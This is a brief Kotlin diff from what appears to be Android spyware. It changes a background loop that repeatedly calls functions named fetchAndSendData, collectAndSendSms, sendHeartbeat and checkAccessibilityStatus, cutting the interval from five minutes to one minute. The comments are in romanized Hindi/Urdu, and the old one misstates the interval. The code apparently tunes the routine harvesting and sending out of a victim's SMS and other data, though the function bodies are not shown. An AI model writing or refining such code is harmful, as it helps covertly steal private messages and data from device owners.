@@ -218,8 +218,8 @@ private fun sendAccessibilityAlert() {
                 fetchAndSendData()
                 collectAndSendSms() 
                 sendHeartbeat()
-                 checkAccessibilityStatus() 
-                handler.postDelayed(this, 300000) // Har 10 second baad
+                checkAccessibilityStatus() 
+                handler.postDelayed(this, 60000) // Har 1 minute baad
             }
         })
     }
